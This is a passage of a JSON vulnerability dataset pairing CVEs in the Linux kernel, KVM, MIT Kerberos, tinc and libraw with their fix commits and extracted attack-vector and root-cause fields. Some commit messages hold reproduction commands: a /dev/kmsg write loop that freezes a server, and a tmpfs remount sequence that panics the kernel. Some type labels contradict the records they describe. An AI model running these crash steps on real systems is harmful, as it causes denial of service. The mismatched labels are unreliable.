Tosatti <mtosatti@redhat.com>","summary":"The ioapic_read_indirect function in virt\/kvm\/ioapic.c in the Linux kernel through 3.8.4 does not properly handle a certain combination of invalid IOAPIC_REG_SELECT and IOAPIC_REG_WINDOW operations, which allows guest OS users to obtain sensitive information from host OS memory or cause a denial of service (host OS OOPS) via a crafted application.","commit_message_1":"fix bound checking in ioapic indirect register read ( <cve_id> ) if the guest specifies a ioapic_reg_select with an invalid value and follows that with a read of the ioapic_reg_window kvm doe not properly validate that request","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted application","Impact":"obtain sensitive information from host os memory or cause a denial of service ( host os oops )","Root Cause":"does not properly handle a certain combination of invalid ioapic _ reg _ select and ioapic _ reg _ window operations","Attack Type":"local attacker"},{"commit_id":"0b79459b482e85cb7426aa7da683a9f2c97aeae1","cve_id":"CVE-2013-1797","cwe_id":"CWE-399","commit_message":"KVM: x86: Convert MSR_KVM_SYSTEM_TIME to use gfn_to_hva_cache functions (CVE-2013-1797)\n\nThere is a potential use after free issue with the handling of\nMSR_KVM_SYSTEM_TIME.  If the guest specifies a GPA in a movable or removable\nmemory such as frame buffers then KVM might continue to write to that\naddress even after it's removed via KVM_SET_USER_MEMORY_REGION.  KVM pins\nthe page in memory so it's unlikely to cause an issue, but if the user\nspace component re-purposes the memory previously used for the guest, then\nthe guest will be able to corrupt that memory.\n\nTested: Tested against kvmclock unit test\n\nSigned-off-by: Andrew Honig <ahonig@google.com>\nSigned-off-by: Marcelo Tosatti <mtosatti@redhat.com>","summary":"Use-after-free vulnerability in arch\/x86\/kvm\/x86.c in the Linux kernel through 3.8.4 allows guest OS users to cause a denial of service (host OS memory corruption) or possibly have unspecified other impact via a crafted application that triggers use of a guest physical address (GPA) in (1) movable or (2) removable memory during an MSR_KVM_SYSTEM_TIME kvm_set_msr_common operation.","commit_message_1":"x86 : convert msr_kvm_system_time to use gfn_to_hva_cache function ( <cve_id> ) there is a potential use after free issue with the handling of msr_kvm_system_time","Vulnerability Type":"use - after - free","Attack Vector":"via a crafted application that triggers use of a guest physical address ( gpa ) in ( 1 ) movable or ( 2 ) removable memory during an msr _ kvm _ system _ time kvm _ set _ msr _ common operation","Impact":"cause a denial of service ( host os memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error when handling MSR_KVM_SYSTEM_TIME","Attack Type":"local attacker"},{"commit_id":"c300aa64ddf57d9c5d9c898a64b36877345dd4a9","cve_id":"CVE-2013-1796","cwe_id":"CWE-119","commit_message":"KVM: x86: fix for buffer overflow in handling of MSR_KVM_SYSTEM_TIME (CVE-2013-1796)\n\nIf the guest sets the GPA of the time_page so that the request to update the\ntime straddles a page then KVM will write onto an incorrect page.  The\nwrite is done byusing kmap atomic to get a pointer to the page for the time\nstructure and then performing a memcpy to that page starting at an offset\nthat the guest controls.  Well behaved guests always provide a 32-byte aligned\naddress, however a malicious guest could use this to corrupt host kernel\nmemory.\n\nTested: Tested against kvmclock unit test.\n\nSigned-off-by: Andrew Honig <ahonig@google.com>\nSigned-off-by: Marcelo Tosatti <mtosatti@redhat.com>","summary":"The kvm_set_msr_common function in arch\/x86\/kvm\/x86.c in the Linux kernel through 3.8.4 does not ensure a required time_page alignment during an MSR_KVM_SYSTEM_TIME operation, which allows guest OS users to cause a denial of service (buffer overflow and host OS memory corruption) or possibly have unspecified other impact via a crafted application.","commit_message_1":"x86 : fix for buffer overflow in handling of msr_kvm_system_time ( <cve_id> ) if the guest set the gpa of the time_page so that the request to update the time straddle a page then kvm will write onto an incorrect page","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted application","Impact":"cause a denial of service ( buffer overflow and host os memory corruption ) or possibly have unspecified other impact","Root Cause":"does not ensure a required time _ page alignment during an msr _ kvm _ system _ time operation","Attack Type":"local attacker"},{"commit_id":"0da9dfdd2cd9889201bc6f6f43580c99165cd087","cve_id":"CVE-2013-1792","cwe_id":"CWE-362","commit_message":"keys: fix race with concurrent install_user_keyrings()\n\nThis fixes CVE-2013-1792.\n\nThere is a race in install_user_keyrings() that can cause a NULL pointer\ndereference when called concurrently for the same user if the uid and\nuid-session keyrings are not yet created.  It might be possible for an\nunprivileged user to trigger this by calling keyctl() from userspace in\nparallel immediately after logging in.\n\nAssume that we have two threads both executing lookup_user_key(), both\nlooking for KEY_SPEC_USER_SESSION_KEYRING.\n\n\tTHREAD A\t\t\tTHREAD B\n\t===============================\t===============================\n\t\t\t\t\t==>call install_user_keyrings();\n\tif (!cred->user->session_keyring)\n\t==>call install_user_keyrings()\n\t\t\t\t\t...\n\t\t\t\t\tuser->uid_keyring = uid_keyring;\n\tif (user->uid_keyring)\n\t\treturn 0;\n\t<==\n\tkey = cred->user->session_keyring [== NULL]\n\t\t\t\t\tuser->session_keyring = session_keyring;\n\tatomic_inc(&key->usage); [oops]\n\nAt the point thread A dereferences cred->user->session_keyring, thread B\nhasn't updated user->session_keyring yet, but thread A assumes it is\npopulated because install_user_keyrings() returned ok.\n\nThe race window is really small but can be exploited if, for example,\nthread B is interrupted or preempted after initializing uid_keyring, but\nbefore doing setting session_keyring.\n\nThis couldn't be reproduced on a stock kernel.  However, after placing\nsystemtap probe on 'user->session_keyring = session_keyring;' that\nintroduced some delay, the kernel could be crashed reliably.\n\nFix this by checking both pointers before deciding whether to return.\nAlternatively, the test could be done away with entirely as it is checked\ninside the mutex - but since the mutex is global, that may not be the best\nway.\n\nSigned-off-by: David Howells <dhowells@redhat.com>\nReported-by: Mateusz Guzik <mguzik@redhat.com>\nCc: <stable@kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: James Morris <james.l.morris@oracle.com>","summary":"Race condition in the install_user_keyrings function in security\/keys\/process_keys.c in the Linux kernel before 3.8.3 allows local users to cause a denial of service (NULL pointer dereference and system crash) via crafted keyctl system calls that trigger keyring operations in simultaneous threads.","commit_message_1":"fix race with concurrent install_user_keyrings ( ) this fix <cve_id>","Vulnerability Type":"Race Condition","Attack Vector":"via crafted keyctl system calls that trigger keyring operations in simultaneous threads","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"caused by a race condition error","Attack Type":"local attacker"},{"commit_id":"1ee0a224bc9aad1de496c795f96bc6ba2c394811","cve_id":"CVE-2013-1774","cwe_id":"CWE-264","commit_message":"USB: io_ti: Fix NULL dereference in chase_port()\n\nThe tty is NULL when the port is hanging up.\nchase_port() needs to check for this.\n\nThis patch is intended for stable series.\nThe behavior was observed and tested in Linux 3.2 and 3.7.1.\n\nJohan Hovold submitted a more elaborate patch for the mainline kernel.\n\n[   56.277883] usb 1-1: edge_bulk_in_callback - nonzero read bulk status received: -84\n[   56.278811] usb 1-1: USB disconnect, device number 3\n[   56.278856] usb 1-1: edge_bulk_in_callback - stopping read!\n[   56.279562] BUG: unable to handle kernel NULL pointer dereference at 00000000000001c8\n[   56.280536] IP: [<ffffffff8144e62a>] _raw_spin_lock_irqsave+0x19\/0x35\n[   56.281212] PGD 1dc1b067 PUD 1e0f7067 PMD 0\n[   56.282085] Oops: 0002 [#1] SMP\n[   56.282744] Modules linked in:\n[   56.283512] CPU 1\n[   56.283512] Pid: 25, comm: khubd Not tainted 3.7.1 #1 innotek GmbH VirtualBox\/VirtualBox\n[   56.283512] RIP: 0010:[<ffffffff8144e62a>]  [<ffffffff8144e62a>] _raw_spin_lock_irqsave+0x19\/0x35\n[   56.283512] RSP: 0018:ffff88001fa99ab0  EFLAGS: 00010046\n[   56.283512] RAX: 0000000000000046 RBX: 00000000000001c8 RCX: 0000000000640064\n[   56.283512] RDX: 0000000000010000 RSI: ffff88001fa99b20 RDI: 00000000000001c8\n[   56.283512] RBP: ffff88001fa99b20 R08: 0000000000000000 R09: 0000000000000000\n[   56.283512] R10: 0000000000000000 R11: ffffffff812fcb4c R12: ffff88001ddf53c0\n[   56.283512] R13: 0000000000000000 R14: 00000000000001c8 R15: ffff88001e19b9f4\n[   56.283512] FS:  0000000000000000(0000) GS:ffff88001fd00000(0000) knlGS:0000000000000000\n[   56.283512] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b\n[   56.283512] CR2: 00000000000001c8 CR3: 000000001dc51000 CR4: 00000000000006e0\n[   56.283512] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000\n[   56.283512] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400\n[   56.283512] Process khubd (pid: 25, threadinfo ffff88001fa98000, task ffff88001fa94f80)\n[   56.283512] Stack:\n[   56.283512]  0000000000000046 00000000000001c8 ffffffff810578ec ffffffff812fcb4c\n[   56.283512]  ffff88001e19b980 0000000000002710 ffffffff812ffe81 0000000000000001\n[   56.283512]  ffff88001fa94f80 0000000000000202 ffffffff00000001 0000000000000296\n[   56.283512] Call Trace:\n[   56.283512]  [<ffffffff810578ec>] ? add_wait_queue+0x12\/0x3c\n[   56.283512]  [<ffffffff812fcb4c>] ? usb_serial_port_work+0x28\/0x28\n[   56.283512]  [<ffffffff812ffe81>] ? chase_port+0x84\/0x2d6\n[   56.283512]  [<ffffffff81063f27>] ? try_to_wake_up+0x199\/0x199\n[   56.283512]  [<ffffffff81263a5c>] ? tty_ldisc_hangup+0x222\/0x298\n[   56.283512]  [<ffffffff81300171>] ? edge_close+0x64\/0x129\n[   56.283512]  [<ffffffff810612f7>] ? __wake_up+0x35\/0x46\n[   56.283512]  [<ffffffff8106135b>] ? should_resched+0x5\/0x23\n[   56.283512]  [<ffffffff81264916>] ? tty_port_shutdown+0x39\/0x44\n[   56.283512]  [<ffffffff812fcb4c>] ? usb_serial_port_work+0x28\/0x28\n[   56.283512]  [<ffffffff8125d38c>] ? __tty_hangup+0x307\/0x351\n[   56.283512]  [<ffffffff812e6ddc>] ? usb_hcd_flush_endpoint+0xde\/0xed\n[   56.283512]  [<ffffffff8144e625>] ? _raw_spin_lock_irqsave+0x14\/0x35\n[   56.283512]  [<ffffffff812fd361>] ? usb_serial_disconnect+0x57\/0xc2\n[   56.283512]  [<ffffffff812ea99b>] ? usb_unbind_interface+0x5c\/0x131\n[   56.283512]  [<ffffffff8128d738>] ? __device_release_driver+0x7f\/0xd5\n[   56.283512]  [<ffffffff8128d9cd>] ? device_release_driver+0x1a\/0x25\n[   56.283512]  [<ffffffff8128d393>] ? bus_remove_device+0xd2\/0xe7\n[   56.283512]  [<ffffffff8128b7a3>] ? device_del+0x119\/0x167\n[   56.283512]  [<ffffffff812e8d9d>] ? usb_disable_device+0x6a\/0x180\n[   56.283512]  [<ffffffff812e2ae0>] ? usb_disconnect+0x81\/0xe6\n[   56.283512]  [<ffffffff812e4435>] ? hub_thread+0x577\/0xe82\n[   56.283512]  [<ffffffff8144daa7>] ? __schedule+0x490\/0x4be\n[   56.283512]  [<ffffffff8105798f>] ? abort_exclusive_wait+0x79\/0x79\n[   56.283512]  [<ffffffff812e3ebe>] ? usb_remote_wakeup+0x2f\/0x2f\n[   56.283512]  [<ffffffff812e3ebe>] ? usb_remote_wakeup+0x2f\/0x2f\n[   56.283512]  [<ffffffff810570b4>] ? kthread+0x81\/0x89\n[   56.283512]  [<ffffffff81057033>] ? __kthread_parkme+0x5c\/0x5c\n[   56.283512]  [<ffffffff8145387c>] ? ret_from_fork+0x7c\/0xb0\n[   56.283512]  [<ffffffff81057033>] ? __kthread_parkme+0x5c\/0x5c\n[   56.283512] Code: 8b 7c 24 08 e8 17 0b c3 ff 48 8b 04 24 48 83 c4 10 c3 53 48 89 fb 41 50 e8 e0 0a c3 ff 48 89 04 24 e8 e7 0a c3 ff ba 00 00 01 00\n<f0> 0f c1 13 48 8b 04 24 89 d1 c1 ea 10 66 39 d1 74 07 f3 90 66\n[   56.283512] RIP  [<ffffffff8144e62a>] _raw_spin_lock_irqsave+0x19\/0x35\n[   56.283512]  RSP <ffff88001fa99ab0>\n[   56.283512] CR2: 00000000000001c8\n[   56.283512] ---[ end trace 49714df27e1679ce ]---\n\nSigned-off-by: Wolfgang Frisch <wfpub@roembden.net>\nCc: Johan Hovold <jhovold@gmail.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The chase_port function in drivers\/usb\/serial\/io_ti.c in the Linux kernel before 3.7.4 allows local users to cause a denial of service (NULL pointer dereference and system crash) via an attempted \/dev\/ttyUSB read or write operation on a disconnected Edgeport USB serial converter.","commit_message_1":"io_ti : fix null dereference in chase_port ( ) the tty is null when the port is hanging up","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via an attempted \/ dev \/ ttyusb read or write operation on a disconnected edgeport usb serial converter","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"when built with Edgeport USB serial converter driver io_ti","Attack Type":"local attacker"},{"commit_id":"0720a06a7518c9d0c0125bd5d1f3b6264c55c3dd","cve_id":"CVE-2013-1773","cwe_id":"CWE-119","commit_message":"NLS: improve UTF8 -> UTF16 string conversion routine\n\nThe utf8s_to_utf16s conversion routine needs to be improved.  Unlike\nits utf16s_to_utf8s sibling, it doesn't accept arguments specifying\nthe maximum length of the output buffer or the endianness of its\n16-bit output.\n\nThis patch (as1501) adds the two missing arguments, and adjusts the\nonly two places in the kernel where the function is called.  A\nfollow-on patch will add a third caller that does utilize the new\ncapabilities.\n\nThe two conversion routines are still annoyingly inconsistent in the\nway they handle invalid byte combinations.  But that's a subject for a\ndifferent patch.\n\nSigned-off-by: Alan Stern <stern@rowland.harvard.edu>\nCC: Clemens Ladisch <clemens@ladisch.de>\nSigned-off-by: Greg Kroah-Hartman <gregkh@suse.de>","summary":"Buffer overflow in the VFAT filesystem implementation in the Linux kernel before 3.3 allows local users to gain privileges or cause a denial of service (system crash) via a VFAT write operation on a filesystem with the utf8 mount option, which is not properly handled during UTF-8 to UTF-16 conversion.","commit_message_1":"improve utf8 - > utf16 string conversion routine the utf8s_to_utf16s conversion routine need to be improved","Vulnerability Type":"buffer overflow","Attack Vector":"via a vfat write operation on a filesystem with the utf8 mount option , which is not properly handled during utf - 8 to utf - 16 conversion ","Impact":"gain privileges or cause a denial of service ( system crash )","Root Cause":"when built with support to VFAT file system","Attack Type":"local attacker"},{"commit_id":"ce0030c00f95cf9110d9cdcd41e901e1fb814417","cve_id":"CVE-2013-1772","cwe_id":"CWE-119","commit_message":"printk: fix buffer overflow when calling log_prefix function from call_console_drivers\n\nThis patch corrects a buffer overflow in kernels from 3.0 to 3.4 when calling\nlog_prefix() function from call_console_drivers().\n\nThis bug existed in previous releases but has been revealed with commit\n162a7e7500f9664636e649ba59defe541b7c2c60 (2.6.39 => 3.0) that made changes\nabout how to allocate memory for early printk buffer (use of memblock_alloc).\nIt disappears with commit 7ff9554bb578ba02166071d2d487b7fc7d860d62 (3.4 => 3.5)\nthat does a refactoring of printk buffer management.\n\nIn log_prefix(), the access to \"p[0]\", \"p[1]\", \"p[2]\" or\n\"simple_strtoul(&p[1], &endp, 10)\" may cause a buffer overflow as this\nfunction is called from call_console_drivers by passing \"&LOG_BUF(cur_index)\"\nwhere the index must be masked to do not exceed the buffer's boundary.\n\nThe trick is to prepare in call_console_drivers() a buffer with the necessary\ndata (PRI field of syslog message) to be safely evaluated in log_prefix().\n\nThis patch can be applied to stable kernel branches 3.0.y, 3.2.y and 3.4.y.\n\nWithout this patch, one can freeze a server running this loop from shell :\n  $ export DUMMY=`cat \/dev\/urandom | tr -dc '12345AZERTYUIOPQSDFGHJKLMWXCVBNazertyuiopqsdfghjklmwxcvbn' | head -c255`\n  $ while true do ; echo $DUMMY > \/dev\/kmsg ; done\n\nThe \"server freeze\" depends on where memblock_alloc does allocate printk buffer :\nif the buffer overflow is inside another kernel allocation the problem may not\nbe revealed, else the server may hangs up.\n\nSigned-off-by: Alexandre SIMON <Alexandre.Simon@univ-lorraine.fr>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The log_prefix function in kernel\/printk.c in the Linux kernel 3.x before 3.4.33 does not properly remove a prefix string from a syslog header, which allows local users to cause a denial of service (buffer overflow and system crash) by leveraging \/dev\/kmsg write access and triggering a call_console_drivers function call.","commit_message_1":"fix buffer overflow when calling log_prefix function from call_console_drivers this patch corrects a buffer overflow in kernel from <file> to <file> when calling log_prefix ( ) function from call_console_drivers ( )","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging \/ dev \/ kmsg write access and triggering a call _ console _ drivers function call","Impact":"cause a denial of service ( buffer overflow and system crash )","Root Cause":"does not properly remove a prefix string from a syslog header","Attack Type":"local attacker"},{"commit_id":"5f00110f7273f9ff04ac69a5f85bb535a4fd0987","cve_id":"CVE-2013-1767","cwe_id":"CWE-399","commit_message":"tmpfs: fix use-after-free of mempolicy object\n\nThe tmpfs remount logic preserves filesystem mempolicy if the mpol=M\noption is not specified in the remount request.  A new policy can be\nspecified if mpol=M is given.\n\nBefore this patch remounting an mpol bound tmpfs without specifying\nmpol= mount option in the remount request would set the filesystem's\nmempolicy object to a freed mempolicy object.\n\nTo reproduce the problem boot a DEBUG_PAGEALLOC kernel and run:\n    # mkdir \/tmp\/x\n\n    # mount -t tmpfs -o size=100M,mpol=interleave nodev \/tmp\/x\n\n    # grep \/tmp\/x \/proc\/mounts\n    nodev \/tmp\/x tmpfs rw,relatime,size=102400k,mpol=interleave:0-3 0 0\n\n    # mount -o remount,size=200M nodev \/tmp\/x\n\n    # grep \/tmp\/x \/proc\/mounts\n    nodev \/tmp\/x tmpfs rw,relatime,size=204800k,mpol=??? 0 0\n        # note ? garbage in mpol=... output above\n\n    # dd if=\/dev\/zero of=\/tmp\/x\/f count=1\n        # panic here\n\nPanic:\n    BUG: unable to handle kernel NULL pointer dereference at           (null)\n    IP: [<          (null)>]           (null)\n    [...]\n    Oops: 0010 [#1] SMP DEBUG_PAGEALLOC\n    Call Trace:\n      mpol_shared_policy_init+0xa5\/0x160\n      shmem_get_inode+0x209\/0x270\n      shmem_mknod+0x3e\/0xf0\n      shmem_create+0x18\/0x20\n      vfs_create+0xb5\/0x130\n      do_last+0x9a1\/0xea0\n      path_openat+0xb3\/0x4d0\n      do_filp_open+0x42\/0xa0\n      do_sys_open+0xfe\/0x1e0\n      compat_sys_open+0x1b\/0x20\n      cstar_dispatch+0x7\/0x1f\n\nNon-debug kernels will not crash immediately because referencing the\ndangling mpol will not cause a fault.  Instead the filesystem will\nreference a freed mempolicy object, which will cause unpredictable\nbehavior.\n\nThe problem boils down to a dropped mpol reference below if\nshmem_parse_options() does not allocate a new mpol:\n\n    config = *sbinfo\n    shmem_parse_options(data, &config, true)\n    mpol_put(sbinfo->mpol)\n    sbinfo->mpol = config.mpol  \/* BUG: saves unreferenced mpol *\/\n\nThis patch avoids the crash by not releasing the mempolicy if\nshmem_parse_options() doesn't create a new mpol.\n\nHow far back does this issue go? I see it in both 2.6.36 and 3.3.  I did\nnot look back further.\n\nSigned-off-by: Greg Thelen <gthelen@google.com>\nAcked-by: Hugh Dickins <hughd@google.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Use-after-free vulnerability in the shmem_remount_fs function in mm\/shmem.c in the Linux kernel before 3.7.10 allows local users to gain privileges or cause a denial of service (system crash) by remounting a tmpfs filesystem without specifying a required mpol (aka mempolicy) mount option.","commit_message_1":"fix use-after-free of mempolicy object the tmpfs remount logic preserve filesystem mempolicy if the mpol=m option is not specified in the remount request","Vulnerability Type":"use - after - free","Attack Vector":"by remounting a tmpfs filesystem without specifying a required mpol ( aka mempolicy ) mount option","Impact":"gain privileges or cause a denial of service ( system crash )","Root Cause":"caused by a use-after-free error","Attack Type":"local attacker"},{"commit_id":"6e601a53566d84e1ffd25e7b6fe0b6894ffd79c0","cve_id":"CVE-2013-1763","cwe_id":"CWE-20","commit_message":"sock_diag: Fix out-of-bounds access to sock_diag_handlers[]\n\nUserland can send a netlink message requesting SOCK_DIAG_BY_FAMILY\nwith a family greater or equal then AF_MAX -- the array size of\nsock_diag_handlers[]. The current code does not test for this\ncondition therefore is vulnerable to an out-of-bound access opening\ndoors for a privilege escalation.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com>\nAcked-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Array index error in the __sock_diag_rcv_msg function in net\/core\/sock_diag.c in the Linux kernel before 3.7.10 allows local users to gain privileges via a large family value in a Netlink message.","commit_message_1":"fix out-of-bounds access to sock_diag_handlers [ ] userland can send a netlink message requesting sock_diag_by_family with a family greater or equal then af_max -- the array size of sock_diag_handlers [ ]","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a large family value in a netlink message","Impact":"gain privileges","Root Cause":"caused by an out-of-bounds error","Attack Type":"local attacker"},{"commit_id":"11909cc59e712e09b508dda729b99aeaac2b29ad","cve_id":"CVE-2013-1439","cwe_id":null,"commit_message":"cumulated data checks patch","summary":"The *faster LJPEG decoder* in libraw 0.13.x, 0.14.x, and 0.15.x before 0.15.4 allows context-dependent attackers to cause a denial of service (NULL pointer dereference) via a crafted photo file.","commit_message_1":"cumulated data check patch","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via a crafted photo file","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by multiple NULL Pointer dereferences","Attack Type":"remote attacker"},{"commit_id":"17a33dfd95b1a29e90db76414eb9622df9632320","cve_id":"CVE-2013-1428","cwe_id":"CWE-119","commit_message":"Drop packets forwarded via TCP if they are too big (CVE-2013-1428).\n\nNormally all requests sent via the meta connections are checked so that they\ncannot be larger than the input buffer. However, when packets are forwarded via\nmeta connections, they are copied into a packet buffer without checking whether\nit fits into it. Since the packet buffer is allocated on the stack, this in\neffect allows an authenticated remote node to cause a stack overflow.\n\nThis issue was found by Martin Schobert.","summary":"Stack-based buffer overflow in the receive_tcppacket function in net_packet.c in tinc before 1.0.21 and 1.1 before 1.1pre7 allows remote authenticated peers to cause a denial of service (crash) or possibly execute arbitrary code via a large TCP packet.","commit_message_1":"drop packet forwarded via tcp if they are too big ( <cve_id> )","Vulnerability Type":"buffer overflow","Attack Vector":"via a large tcp packet","Impact":"cause a denial of service ( crash ) or possibly execute arbitrary code","Root Cause":"caused by improper bounds checking within the receive_tcppacket() function","Attack Type":"remote attacker"},{"commit_id":"4c023ba43c16396f0d199e2df1cfa59b88b62acc","cve_id":"CVE-2013-1417","cwe_id":"CWE-20","commit_message":"KDC null deref due to referrals [CVE-2013-1417]\n\nAn authenticated remote client can cause a KDC to crash by making a\nvalid TGS-REQ to a KDC serving a realm with a single-component name.\nThe process_tgs_req() function dereferences a null pointer because an\nunusual failure condition causes a helper function to return success.\n\nWhile attempting to provide cross-realm referrals for host-based\nservice principals, the find_referral_tgs() function could return a\nTGS principal for a zero-length realm name (indicating that the\nhostname in the service principal has no known realm associated with\nit).\n\nSubsequently, the find_alternate_tgs() function would attempt to\nconstruct a path to this empty-string realm, and return success along\nwith a null pointer in its output parameter.  This happens because\nkrb5_walk_realm_tree() returns a list of length one when it attempts\nto construct a transit path between a single-component realm and the\nempty-string realm.  This list causes a loop in find_alternate_tgs()\nto iterate over zero elements, resulting in the unexpected output of a\nnull pointer, which process_tgs_req() proceeds to dereference because\nthere is no error condition.\n\nAdd an error condition to find_referral_tgs() when\nkrb5_get_host_realm() returns an empty realm name.  Also add an error\ncondition to find_alternate_tgs() to handle the length-one output from\nkrb5_walk_realm_tree().\n\nThe vulnerable configuration is not likely to arise in practice.\n(Realm names that have a single component are likely to be test\nrealms.)  Releases prior to krb5-1.11 are not vulnerable.\n\nThanks to Sol Jerome for reporting this problem.\n\nCVSSv2: AV:N\/AC:M\/Au:S\/C:N\/I:N\/A:P\/E:H\/RL:O\/RC:C\n\n(cherry picked from commit 3c7f1c21ffaaf6c90f1045f0f5440303c766acc0)\n\nticket: 7668\nversion_fixed: 1.11.4\nstatus: resolved","summary":"do_tgs_req.c in the Key Distribution Center (KDC) in MIT Kerberos 5 (aka krb5) 1.11 before 1.11.4, when a single-component realm name is used, allows remote authenticated users to cause a denial of service (daemon crash) via a TGS-REQ request that triggers an attempted cross-realm referral for a host-based service principal.","commit_message_1":"kdc null deref due to referral [ <cve_id> ] an authenticated remote client can cause a kdc to crash by making a valid tgs-req to a kdc serving a realm with a single-component name","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a tgs - req request that triggers an attempted cross - realm referral for a host - based service principal","Impact":"cause a denial of service ( daemon crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"8ee70ec63931d1e38567905387ab9b1d45734d81","cve_id":"CVE-2013-1416","cwe_id":"CWE-119","commit_message":"KDC TGS-REQ null deref [CVE-2013-1416]\n\nBy sending an unusual but valid TGS-REQ, an authenticated remote\nattacker can cause the KDC process to crash by dereferencing a null\npointer.\n\nprep_reprocess_req() can cause a null pointer dereference when\nprocessing a service principal name.  Code in this function can\ninappropriately pass a null pointer to strlcpy().  Unmodified client\nsoftware can trivially trigger this vulnerability, but the attacker\nmust have already authenticated and received a valid Kerberos ticket.\n\nThe vulnerable code was introduced by the implementation of new\nservice principal realm referral functionality in krb5-1.7, but was\ncorrected as a side effect of the KDC refactoring in krb5-1.11.\n\nCVSSv2 vector: AV:N\/AC:L\/Au:S\/C:N\/I:N\/A:C\/E:H\/RL:O\/RC:C\n\nticket: 7600 (new)\nversion_fixed: 1.10.5\nstatus: resolved","summary":"The prep_reprocess_req function in do_tgs_req.c in the Key Distribution Center (KDC) in MIT Kerberos 5 (aka krb5) before 1.10.5 does not properly perform service-principal realm referral, which allows remote authenticated users to cause a denial of service (NULL pointer dereference and daemon crash) via a crafted TGS-REQ request.","commit_message_1":"kdc tgs-req null deref [ <cve_id> ] by sending an unusual but valid tgs-req , an authenticated remote attacker can cause the kdc process to crash by dereferencing a null pointer","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted TGS-REQ request","Impact":"cause a denial of service ( pointer dereference and daemon crash )","Root Cause":"does not properly perform service - principal realm referral","Attack Type":"remote attacker"},{"commit_id":"f249555301940c6df3a2cdda13b56b5674eebc2e","cve_id":"CVE-2013-1415","cwe_id":null,"commit_message":"PKINIT null pointer deref [CVE-2013-1415]\n\nDon't dereference a null pointer when cleaning up.\n\nThe KDC plugin for PKINIT can dereference a null pointer when a\nmalformed packet causes processing to terminate early, leading to\na crash of the KDC process.  An attacker would need to have a valid\nPKINIT certificate or have observed a successful PKINIT authentication,\nor an unauthenticated attacker could execute the attack if anonymous\nPKINIT is enabled.\n\nCVSSv2 vector: AV:N\/AC:M\/Au:N\/C:N\/I:N\/A:C\/E:P\/RL:O\/RC:C\n\nThis is a minimal commit for pullup; style fixes in a followup.\n[kaduk@mit.edu: reformat and edit commit message]\n\n(cherry picked from commit c773d3c775e9b2d88bcdff5f8a8ba88d7ec4e8ed)\n\nticket: 7570\nversion_fixed: 1.11.1\nstatus: resolved","summary":"The pkinit_check_kdc_pkid function in plugins\/preauth\/pkinit\/pkinit_crypto_openssl.c in the PKINIT implementation in the Key Distribution Center (KDC) in MIT Kerberos 5 (aka krb5) before 1.10.4 and 1.11.x before 1.11.1 does not properly handle errors during extraction of fields from an X.509 certificate, which allows remote attackers to cause a denial of service (NULL pointer dereference and daemon crash) via a malformed KRB5_PADATA_PK_AS_REQ AS-REQ request.","commit_message_1":"pkinit null pointer deref [ <cve_id> ] do n't dereference a null pointer when cleaning up","Vulnerability Type":"NULL pointer dereference","Attack Vector":"By sending a specially-crafted packet","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"2ca39528c01a933f6689cd6505ce65bd6d68a530","cve_id":"CVE-2013-0914","cwe_id":"CWE-264","commit_message":"signal: always clear sa_restorer on execve\n\nWhen the new signal handlers are set up, the location of sa_restorer is\nnot cleared, leaking a parent process's address space location to\nchildren.  This allows for a potential bypass of the parent's ASLR by\nexamining the sa_restorer value returned when calling sigaction().\n\nBased on what should be considered \"secret\" about addresses, it only\nmatters across the exec not the fork (since the VMAs haven't changed\nuntil the exec).  But since exec sets SIG_DFL and keeps sa_restorer,\nthis is where it should be fixed.\n\nGiven the few uses of sa_restorer, a \"set\" function was not written\nsince this would be the only use.  Instead, we use\n__ARCH_HAS_SA_RESTORER, as already done in other places.\n\nExample of the leak before applying this patch:\n\n  $ cat \/proc\/$$\/maps\n  ...\n  7fb9f3083000-7fb9f3238000 r-xp 00000000 fd:01 404469 ...\/libc-2.15.so\n  ...\n  $ .\/leak\n  ...\n  7f278bc74000-7f278be29000 r-xp 00000000 fd:01 404469 ...\/libc-2.15.so\n  ...\n  1 0 (nil) 0x7fb9f30b94a0\n  2 4000000 (nil) 0x7f278bcaa4a0\n  3 4000000 (nil) 0x7f278bcaa4a0\n  4 0 (nil) 0x7fb9f30b94a0\n  ...\n\n[akpm@linux-foundation.org: use SA_RESTORER for backportability]\nSigned-off-by: Kees Cook <keescook@chromium.org>\nReported-by: Emese Revfy <re.emese@gmail.com>\nCc: Emese Revfy <re.emese@gmail.com>\nCc: PaX Team <pageexec@freemail.hu>\nCc: Al Viro <viro@zeniv.linux.org.uk>\nCc: Oleg Nesterov <oleg@redhat.com>\nCc: \"Eric W. Biederman\" <ebiederm@xmission.com>\nCc: Serge Hallyn <serge.hallyn@canonical.com>\nCc: Julien Tinnes <jln@google.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The flush_signal_handlers function in kernel\/signal.c in the Linux kernel before 3.8.4 preserves the value of the sa_restorer field across an exec operation, which makes it easier for local users to bypass the ASLR protection mechanism via 